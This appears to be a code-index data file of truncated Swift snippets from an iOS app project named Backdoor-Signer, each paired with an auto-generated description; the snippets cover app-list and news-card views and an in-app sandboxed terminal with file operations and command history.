3329,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppViewController.swift","Function processLoadedAppData - implements processloadedappdata functionality","private func processLoadedAppData(
allApps: [StoreAppsData],
newsData: [NewsData],
website: String,
tintColor: String
) {"
3330,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppViewController.swift","Function applyTintColor - implements applytintcolor functionality","private func applyTintColor(_ tintColor: String) {
if !tintColor.isEmpty {"
3331,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppViewController.swift","Function filterAppsIfNeeded - implements filterappsifneeded functionality","private func filterAppsIfNeeded() {
if let filteredApp = shouldFilter() {"
3332,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppViewController.swift","Function setupWebsiteTitleMenu - sets upwebsitetitlemenu","private func setupWebsiteTitleMenu(website: String) {
guard uri.count == 1, !website.isEmpty else { return }"
3333,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppViewController.swift","Function finishLoading - implements finishloading functionality","private func finishLoading() {
UIView.transition(
with: tableView,
duration: 0.3,
options: .transitionCrossDissolve,
animations: {"
3334,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppViewController.swift","MARK: - UITableViewDataSource & UITableViewDelegate","extension SourceAppViewController {
override func tableView(_: UITableView, numberOfRowsInSection _: Int) -> Int {"
3335,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppViewController.swift","Function tableView - implements tableview functionality","override func tableView(_: UITableView, numberOfRowsInSection _: Int) -> Int {
return isFiltering ? filteredApps.count : apps.count
}

override func tableView(_: UITableView, heightForRowAt indexPath: IndexPath) -> CGFloat {"
3336,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppViewController.swift","Function tableView - implements tableview functionality","override func tableView(_: UITableView, heightForRowAt indexPath: IndexPath) -> CGFloat {
let app = isFiltering ? filteredApps[indexPath.row] : apps[indexPath.row]

if let screenshotURLs = app.screenshotURLs,
!screenshotURLs.isEmpty,
Preferences.appDescriptionAppearence != 2
{"
3337,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppViewController.swift","Function tableView - implements tableview functionality","override func tableView(_: UITableView, cellForRowAt indexPath: IndexPath) -> UITableViewCell {
let cell = AppTableViewCell(style: .subtitle, reuseIdentifier: ""RoundedBackgroundCell"")
let app = isFiltering ? filteredApps[indexPath.row] : apps[indexPath.row]

// Configure cell
configureCell(cell, with: app, at: indexPath)

return cell
}
"
3338,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppViewController.swift","Function configureCell - implements configurecell functionality","private func configureCell(_ cell: AppTableViewCell, with app: StoreAppsData, at indexPath: IndexPath) {
cell.configure(with: app)
cell.selectionStyle = .none
cell.backgroundColor = .clear

// Configure button
cell.getButton.tag = indexPath.row
cell.getButton.addTarget(self, action: #selector(getButtonTapped(_:)), for: .touchUpInside)

// Add long press gesture"
3339,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppViewController.swift","Function tableView - implements tableview functionality","override func tableView(
_: UITableView,
contextMenuConfigurationForRowAt indexPath: IndexPath,
point _: CGPoint
) -> UIContextMenuConfiguration? {"
3340,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppViewController.swift","Function createContextMenu - creates contextmenu","private func createContextMenu(for app: StoreAppsData) -> UIMenu {
// Create version actions
let versionActions = app.versions?.map { version in"
3341,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppViewController.swift","Function tableView - implements tableview functionality","override func tableView(_: UITableView, titleForHeaderInSection _: Int) -> String? {
if isFiltering || apps.isEmpty || (highlightAppName != nil) {"
3342,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppViewController.swift","MARK: - Search Controller","extension SourceAppViewController: UISearchControllerDelegate, UISearchBarDelegate {
func setupSearchController() {"
3343,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppViewController.swift","Function setupSearchController - sets upsearchcontroller","func setupSearchController() {
searchController = UISearchController(searchResultsController: nil)
searchController.obscuresBackgroundDuringPresentation = false
searchController.hidesNavigationBarDuringPresentation = true
searchController.searchResultsUpdater = self
searchController.delegate = self
searchController.searchBar.placeholder = String.localized(""SOURCES_APP_VIEW_CONTROLLER_SEARCH_APPS"")

if highlightAppName == nil {"
3344,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppViewController.swift","MARK: - UISearchResultsUpdating","extension SourceAppViewController: UISearchResultsUpdating {
func updateSearchResults(for searchController: UISearchController) {"
3345,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppViewController.swift","Function updateSearchResults - updates searchresults","func updateSearchResults(for searchController: UISearchController) {
let searchText = searchController.searchBar.text ?? """"
filterContentForSearchText(searchText)
tableView.reloadData()
}

private func filterContentForSearchText(_ searchText: String) {"
3346,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppViewController.swift","Function filterContentForSearchText - implements filtercontentforsearchtext functionality","private func filterContentForSearchText(_ searchText: String) {
let lowercasedSearchText = searchText.lowercased()

filteredApps = apps.filter { app in"
3347,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppViewController.swift","Function doesApp - implements doesapp functionality","private func doesApp(_ app: StoreAppsData, matchSearchText searchText: String) -> Bool {
let nameMatch = app.name.lowercased().contains(searchText)
let bundleIdMatch = app.bundleIdentifier.lowercased().contains(searchText)
let developerMatch = app.developerName?.lowercased().contains(searchText) ?? false
let subtitleMatch = app.subtitle?.lowercased().contains(searchText) ?? false
let descriptionMatch = app.localizedDescription?.lowercased().contains(searchText) ?? false

return nameMatch || bundleIdMatch || developerMatch || subtitleMatch || descriptionMatch
}
}"
3348,swift,iOS,struct,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/News/CardContextMenuView.swift","MARK: - CardContextMenuView","struct CardContextMenuView: View {
// MARK: - Properties

@Environment(\.dismiss) var dismiss
let news: NewsData

private enum Constants {"
3349,swift,iOS,enum,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/News/CardContextMenuView.swift","enum Constants - implements functionality related to constants","private enum Constants {
static let imageHeight: CGFloat = 250
static let cornerRadius: CGFloat = 12
static let containerCornerRadius: CGFloat = 16
static let buttonCornerRadius: CGFloat = 10
static let buttonIconPadding: CGFloat = 10

static let stackSpacing: CGFloat = 12
static let contentSpacing: CGFloat = 16
"
3350,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/News/CardContextMenuView.swift","Function renderHeaderImage - implements renderheaderimage functionality","private func renderHeaderImage() -> some View {
if news.imageURL != nil {"
3351,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/News/CardContextMenuView.swift","Function renderContentSection - implements rendercontentsection functionality","private func renderContentSection() -> some View {
VStack(alignment: .leading, spacing: Constants.contentSpacing) {"
3352,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/News/CardContextMenuView.swift","Function renderBackButton - implements renderbackbutton functionality","private func renderBackButton() -> some View {
Button {"
3353,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/News/CardContextMenuView.swift","MARK: - View Extensions","extension View {
/// Cross-platform compatible font weight modifier
func compatFontWeight(_ weight: Font.Weight) -> some View {"
3354,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/News/CardContextMenuView.swift","/ Cross-platform compatible font weight modifier","func compatFontWeight(_ weight: Font.Weight) -> some View {
if #available(iOS 16.0, *) {"
3355,swift,iOS,struct,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/News/NewsCardContainerView.swift","MARK: - NewsCardContainerView","struct NewsCardContainerView: View {
// MARK: - Properties

@Binding var isSheetPresented: Bool
var news: NewsData
@Namespace private var namespace

let uuid = UUID().uuidString

// MARK: - Body"
3356,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/News/NewsCardContainerView.swift","MARK: - View Extensions","extension View {
/// Adds a context menu preview specifically for news items
/// with URL opening capabilities when available
func compactContentMenuPreview(news: NewsData) -> some View {"
3357,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/News/NewsCardContainerView.swift","/ Adds a context menu preview specifically for news items / with URL opening capabilities when available","func compactContentMenuPreview(news: NewsData) -> some View {
if #available(iOS 16.0, *) {"
3358,swift,iOS,struct,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/News/NewsCardView.swift","MARK: - NewsCardView","struct NewsCardView: View {
// MARK: - Properties

var news: NewsData

private enum Constants {"
3359,swift,iOS,enum,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/News/NewsCardView.swift","enum Constants - implements functionality related to constants","private enum Constants {
static let cardWidth: CGFloat = 250
static let cardHeight: CGFloat = 150
static let cornerRadius: CGFloat = 12
static let blurOpacity: Double = 0.97
static let gradientOpacity: Double = 0.7
static let borderOpacity: Double = 0.15
static let borderWidth: CGFloat = 2
static let placeholderOpacity: Double = 0.2
static let animationDuration: Double = 0.3"
3360,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/News/NewsCardView.swift","Function renderBackgroundImage - implements renderbackgroundimage functionality","private func renderBackgroundImage() -> some View {
if news.imageURL != nil {"
3361,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/News/NewsCardView.swift","Function renderBlurOverlay - implements renderbluroverlay functionality","private func renderBlurOverlay() -> some View {
VariableBlurView()
.opacity(Constants.blurOpacity)
.frame(maxWidth: .infinity, maxHeight: .infinity)
.rotationEffect(.degrees(180))
.padding(.top, Constants.topPadding)
}

private func renderTitleContent() -> some View {"
3362,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/News/NewsCardView.swift","Function renderTitleContent - implements rendertitlecontent functionality","private func renderTitleContent() -> some View {
VStack {"
3363,swift,iOS,struct,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/News/NewsCardsScrollView.swift","MARK: - NewsCardsScrollView","struct NewsCardsScrollView: View {
// MARK: - Properties

@State private var newsData: [NewsData]
@State private var sheetStates: [String: Bool] = [:]
@State private var isSheetPresented = false

private enum Constants {"
3364,swift,iOS,enum,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/News/NewsCardsScrollView.swift","enum Constants - implements functionality related to constants","private enum Constants {
static let cardSpacing: CGFloat = 10
}

// MARK: - Initialization

init(newsData: [NewsData]) {"
3365,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/News/NewsCardsScrollView.swift","MARK: - Helper Methods","private func createSheetBinding(for newsItem: NewsData) -> Binding<Bool> {
return Binding(
get: { sheetStates[newsItem.identifier] ?? false },"
3366,swift,iOS,class,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/TerminalFileManager.swift","/ TerminalFileManager provides file system operations for the Terminal interface / This allows users to navigate, view, and manipulate files within the app sandbox","class TerminalFileManager {
// MARK: - Singleton

static let shared = TerminalFileManager()

private init() {}"
3367,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/TerminalFileManager.swift","MARK: - Directory Navigation / Change the current working directory / - Parameter path: The path to change to (absolute or relative) / - Returns: Result with new path or error","func changeDirectory(to path: String) -> Result<String, Error> {
let targetURL: URL

if path.starts(with: ""/"") {"
3368,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/TerminalFileManager.swift","/ Get the current working directory / - Returns: The path of the current directory","func getCurrentDirectory() -> String {
return currentDirectory.path
}

// MARK: - File Operations

/// List files in the current directory
/// - Parameter showHidden: Whether to show hidden files (starting with .)
/// - Returns: Result with array of file information or error
func listFiles(showHidden: Bool = false) -> Result<[FileInfo], Error> {"
3369,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/TerminalFileManager.swift","MARK: - File Operations / List files in the current directory / - Parameter showHidden: Whether to show hidden files (starting with .) / - Returns: Result with array of file information or error","func listFiles(showHidden: Bool = false) -> Result<[FileInfo], Error> {
do {"
3370,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/TerminalFileManager.swift","/ Create a new directory / - Parameter name: Name of the directory to create / - Returns: Result with success message or error","func createDirectory(name: String) -> Result<String, Error> {
let newDirectoryURL = currentDirectory.appendingPathComponent(name)

do {"
3371,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/TerminalFileManager.swift","/ Delete a file or directory / - Parameter name: Name of the file or directory to delete / - Returns: Result with success message or error","func delete(name: String) -> Result<String, Error> {
let itemURL = currentDirectory.appendingPathComponent(name)

do {"
3372,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/TerminalFileManager.swift","/ Move or rename a file or directory / - Parameters: /   - sourceName: Name of the source file or directory /   - destinationName: New name or path for the file or directory / - Returns: Result with success message or error","func move(sourceName: String, destinationName: String) -> Result<String, Error> {
let sourceURL = currentDirectory.appendingPathComponent(sourceName)

// Determine if destination is a path or just a new name
let destinationURL: URL
if destinationName.contains(""/"") {"
3373,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/TerminalFileManager.swift","/ Copy a file or directory / - Parameters: /   - sourceName: Name of the source file or directory /   - destinationName: New name or path for the copy / - Returns: Result with success message or error","func copy(sourceName: String, destinationName: String) -> Result<String, Error> {
let sourceURL = currentDirectory.appendingPathComponent(sourceName)

// Determine if destination is a path or just a new name
let destinationURL: URL
if destinationName.contains(""/"") {"
3374,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/TerminalFileManager.swift","MARK: - File Content Operations / Read the contents of a text file / - Parameter name: Name of the file to read / - Returns: Result with file contents or error","func readFile(name: String) -> Result<String, Error> {
let fileURL = currentDirectory.appendingPathComponent(name)

do {"
3375,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/TerminalFileManager.swift","/ Write text to a file / - Parameters: /   - name: Name of the file to write /   - contents: Text contents to write /   - append: Whether to append to existing file or overwrite / - Returns: Result with success message or error","func writeFile(name: String, contents: String, append: Bool = false) -> Result<String, Error> {
let fileURL = currentDirectory.appendingPathComponent(name)

do {"
3376,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/TerminalFileManager.swift","/ Get information about a file or directory / - Parameter name: Name of the file or directory / - Returns: Result with file information or error","func getFileInfo(name: String) -> Result<FileInfo, Error> {
let itemURL = currentDirectory.appendingPathComponent(name)

do {"
3377,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/TerminalFileManager.swift","/ Search for files matching a pattern / - Parameters: /   - pattern: The search pattern (supports * and ? wildcards) /   - recursive: Whether to search recursively in subdirectories / - Returns: Result with array of matching file paths or error","func findFiles(pattern: String, recursive: Bool = false) -> Result<[String], Error> {
do {"
3378,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/TerminalFileManager.swift","/ Get file permissions / - Parameter name: Name of the file or directory / - Returns: Result with permissions string (e.g., ""rwxr-xr--"") or error","func getPermissions(name: String) -> Result<String, Error> {
let itemURL = currentDirectory.appendingPathComponent(name)

do {"
3379,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/TerminalFileManager.swift","/ Set file permissions / - Parameters: /   - name: Name of the file or directory /   - permissions: Octal permissions value (e.g., 0o755) / - Returns: Result with success message or error","func setPermissions(name: String, permissions: Int) -> Result<String, Error> {
let itemURL = currentDirectory.appendingPathComponent(name)

do {"
3380,swift,iOS,struct,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/TerminalFileManager.swift","MARK: - Supporting Types / Represents information about a file or directory","struct FileInfo {
/// Name of the file or directory
let name: String

/// Full path to the file or directory
let path: String

/// Whether the item is a directory
let isDirectory: Bool
"
3381,swift,iOS,class,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/Components/CommandHistory.swift","class CommandHistory - implements functionality related to command history","class CommandHistory {
private var commands: [String] = []
private var currentIndex: Int = -1
private let maxHistorySize = 100
private let logger = Debug.shared

func addCommand(_ command: String) {"
3382,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/Components/CommandHistory.swift","Function addCommand - implements addcommand functionality","func addCommand(_ command: String) {
// Don't add empty commands
let trimmedCommand = command.trimmingCharacters(in: .whitespacesAndNewlines)
guard !trimmedCommand.isEmpty else {"
3383,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/Components/CommandHistory.swift","Function getPreviousCommand - retrieves previouscommand","func getPreviousCommand() -> String? {
guard !commands.isEmpty, currentIndex >= 0 else {"
3384,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/Components/CommandHistory.swift","Function getNextCommand - retrieves nextcommand","func getNextCommand() -> String? {
guard !commands.isEmpty, currentIndex < commands.count - 1 else {"
3385,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/Components/CommandHistory.swift","Function resetIndex - implements resetindex functionality","func resetIndex() {
currentIndex = commands.count - 1
}

func clearHistory() {"
3386,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/Components/CommandHistory.swift","Function clearHistory - implements clearhistory functionality","func clearHistory() {
logger.log(message: ""Clearing command history"", type: .info)
commands.removeAll()
currentIndex = -1
}

/// Save command history to UserDefaults
func saveHistory() {"
3387,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/Components/CommandHistory.swift","/ Save command history to UserDefaults","func saveHistory() {
UserDefaults.commandHistory = commands
logger.log(message: ""Saved \(commands.count) commands to history"", type: .info)
}

/// Load command history from UserDefaults
func loadHistory() {"
3388,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/Components/CommandHistory.swift","/ Load command history from UserDefaults","func loadHistory() {
if let savedCommands = UserDefaults.commandHistory {"
3389,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/Components/CommandHistory.swift","Add storage extension for command history","extension UserDefaults {
// Using regular UserDefaults instead of generic Storage to avoid static property in generic type error
static var commandHistory: [String]? {"
3390,swift,iOS,class,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/Components/CommandInputView.swift","class CommandInputView - UI component for display and interaction","class CommandInputView: UITextField {
private let padding = UIEdgeInsets(top: 0, left: 10, bottom: 0, right: 10)

override init(frame: CGRect) {"
3391,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/Components/CommandInputView.swift","Function setupTextField - sets uptextfield","private func setupTextField() {
backgroundColor = UIColor(named: ""SettingsCell"") ?? UIColor.darkGray
textColor = UIColor.label
tintColor = UIColor.systemBlue // Cursor color
font = UIFont.monospacedSystemFont(ofSize: 14, weight: .regular)
layer.borderColor = UIColor.gray.cgColor
layer.borderWidth = 1.0
returnKeyType = .send
autocorrectionType = .no
autocapitalizationType = .none"
3392,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/Components/CommandInputView.swift","Function textRect - implements textrect functionality","override func textRect(forBounds bounds: CGRect) -> CGRect {
return bounds.inset(by: padding)
}

override func editingRect(forBounds bounds: CGRect) -> CGRect {"
3393,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/Components/CommandInputView.swift","Function editingRect - implements editingrect functionality","override func editingRect(forBounds bounds: CGRect) -> CGRect {
return bounds.inset(by: padding)
}

override func placeholderRect(forBounds bounds: CGRect) -> CGRect {"
3394,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/Components/CommandInputView.swift","Function placeholderRect - implements placeholderrect functionality","override func placeholderRect(forBounds bounds: CGRect) -> CGRect {
return bounds.inset(by: padding)
}

override func clearButtonRect(forBounds bounds: CGRect) -> CGRect {"
3395,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/Components/CommandInputView.swift","Function clearButtonRect - implements clearbuttonrect functionality","override func clearButtonRect(forBounds bounds: CGRect) -> CGRect {
let originalRect = super.clearButtonRect(forBounds: bounds)
return originalRect.offsetBy(dx: -padding.right / 2, dy: 0)
}

// Handle dark/light mode changes
override func traitCollectionDidChange(_ previousTraitCollection: UITraitCollection?) {"
3396,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/Components/CommandInputView.swift","Handle dark/light mode changes","override func traitCollectionDidChange(_ previousTraitCollection: UITraitCollection?) {
super.traitCollectionDidChange(previousTraitCollection)
if traitCollection.hasDifferentColorAppearance(comparedTo: previousTraitCollection) {"
3397,swift,iOS,class,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/Components/FloatingTerminalButton.swift","/ Floating button that provides quick access to the terminal","class FloatingTerminalButton: UIButton {
// Default position values
private let defaultPosition = CGPoint(x: 60, y: 500)
private let cornerRadius: CGFloat = 25
private let buttonSize: CGFloat = 50

// Accessibility properties
private let accessibilityEdgeMargin: CGFloat = 20
private let minimumTouchArea: CGFloat = 60
"
3398,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/Components/FloatingTerminalButton.swift","Function setupButton - sets upbutton","private func setupButton() {
// Configure button appearance
frame = CGRect(x: 0, y: 0, width: buttonSize, height: buttonSize)
layer.cornerRadius = cornerRadius

// Shadow for better visibility
layer.shadowColor = UIColor.black.cgColor
layer.shadowOffset = CGSize(width: 0, height: 2)
layer.shadowOpacity = 0.3
layer.shadowRadius = 4"
3399,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/Components/FloatingTerminalButton.swift","Function setupAccessibility - sets upaccessibility","private func setupAccessibility() {
// Set accessibility traits
accessibilityTraits = .button

// Set accessibility label and hint
accessibilityLabel = ""Terminal""
accessibilityHint = ""Double tap to open terminal. Drag to move button.""

// Make sure it's accessible
isAccessibilityElement = true"
3400,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/Components/FloatingTerminalButton.swift","Function setupGestures - sets upgestures","private func setupGestures() {
// Pan gesture for dragging
panGesture = UIPanGestureRecognizer(target: self, action: #selector(handlePan(_:)))
panGesture.minimumNumberOfTouches = 1
panGesture.maximumNumberOfTouches = 1
addGestureRecognizer(panGesture)
}

@objc private func handlePan(_ gesture: UIPanGestureRecognizer) {"
3401,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/Components/FloatingTerminalButton.swift","Function handlePan - implements handlepan functionality","@objc private func handlePan(_ gesture: UIPanGestureRecognizer) {
guard let superview = superview else { return }"
3402,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/Components/FloatingTerminalButton.swift","Function savePosition - implements saveposition functionality","private func savePosition() {
UserDefaults.standard.set(center.x, forKey: positionXKey)
UserDefaults.standard.set(center.y, forKey: positionYKey)
}

private func restorePosition() {"
3403,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/Components/FloatingTerminalButton.swift","Function restorePosition - implements restoreposition functionality","private func restorePosition() {
// Get saved position, or use default
let x = UserDefaults.standard.double(forKey: positionXKey)
let y = UserDefaults.standard.double(forKey: positionYKey)

if x > 0 && y > 0 {"
3404,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/Components/FloatingTerminalButton.swift","/ Ensures the button is in an accessible position within the screen bounds","private func ensureAccessiblePosition() {
guard let superview = superview else { return }"
3405,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/Components/FloatingTerminalButton.swift","/ Update button appearance based on system theme","func updateAppearance() {
// Get current trait collection
let interfaceStyle = UIScreen.main.traitCollection.userInterfaceStyle

if interfaceStyle == .dark {"
3406,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/Components/FloatingTerminalButton.swift","Function buttonTapped - implements buttontapped functionality","@objc private func buttonTapped() {
// Provide haptic feedback
let generator = UIImpactFeedbackGenerator(style: .medium)
generator.impactOccurred()

// Post notification to launch terminal
NotificationCenter.default.post(name: .showTerminal, object: nil)

logger.log(message: ""Floating terminal button tapped"", type: .info)
}"
3407,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/Components/FloatingTerminalButton.swift","Function didMoveToSuperview - implements didmovetosuperview functionality","override func didMoveToSuperview() {
super.didMoveToSuperview()

// Restore position when added to view
if superview != nil {"
3408,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/Components/FloatingTerminalButton.swift","Function traitCollectionDidChange - implements traitcollectiondidchange functionality","override func traitCollectionDidChange(_ previousTraitCollection: UITraitCollection?) {
super.traitCollectionDidChange(previousTraitCollection)

// Update appearance when theme changes
if traitCollection.hasDifferentColorAppearance(comparedTo: previousTraitCollection) {"
3409,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/Components/FloatingTerminalButton.swift","Override point inside to increase touch area","override func point(inside point: CGPoint, with event: UIEvent?) -> Bool {
// Expand touch area for better accessibility
let expandedBounds = bounds.insetBy(dx: -15, dy: -15)
return expandedBounds.contains(point)
}

// Handle layout changes
override func layoutSubviews() {"
3410,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/Components/FloatingTerminalButton.swift","Handle layout changes","override func layoutSubviews() {
super.layoutSubviews()

// Ensure button is in accessible position after layout changes
DispatchQueue.main.asyncAfter(deadline: .now() + 0.1) { [weak self] in"
3411,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/Components/FloatingTerminalButton.swift","Add notification names for terminal button control","extension Notification.Name {
static let showTerminal = Notification.Name(""showTerminal"")
static let showTerminalButton = Notification.Name(""showTerminalButton"")
static let hideTerminalButton = Notification.Name(""hideTerminalButton"")
}
"
3412,swift,iOS,class,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/Components/TerminalTextView.swift","class TerminalTextView - UI component for display and interaction","class TerminalTextView: UITextView {
// Terminal color theme
struct TerminalTheme {"
3413,swift,iOS,struct,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/Components/TerminalTextView.swift","Terminal color theme","struct TerminalTheme {
let background: UIColor
let text: UIColor
let userInput: UIColor
let systemOutput: UIColor
let errorOutput: UIColor
}

// Default dark theme
private var darkTheme = TerminalTheme("
3414,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/Components/TerminalTextView.swift","Function setupTextView - sets uptextview","private func setupTextView() {
// Apply theme
updateTheme()

// Configure text view properties
font = UIFont.monospacedSystemFont(ofSize: 14, weight: .regular)
isEditable = false
isSelectable = true
autocorrectionType = .no
autocapitalizationType = .none"
3415,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/Components/TerminalTextView.swift","Function setupCustomMenu - sets upcustommenu","private func setupCustomMenu() {
let menuController = UIMenuController.shared
menuController.menuItems = [
UIMenuItem(title: ""Copy"", action: #selector(copy(_:))),
UIMenuItem(title: ""Select All"", action: #selector(selectAll(_:))),
]
}

private func updateTheme() {"
3416,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/Components/TerminalTextView.swift","Function updateTheme - updates theme","private func updateTheme() {
backgroundColor = currentTheme.background
textColor = currentTheme.text
}

@objc private func userInterfaceStyleDidChange() {"
3417,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/Components/TerminalTextView.swift","Function userInterfaceStyleDidChange - implements userinterfacestyledidchange functionality","@objc private func userInterfaceStyleDidChange() {
updateTheme()
}

// Custom handling for text selection
override func canPerformAction(_ action: Selector, withSender _: Any?) -> Bool {"
3418,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/Components/TerminalTextView.swift","Custom handling for text selection","override func canPerformAction(_ action: Selector, withSender _: Any?) -> Bool {
if action == #selector(copy(_:)) || action == #selector(selectAll(_:)) {"
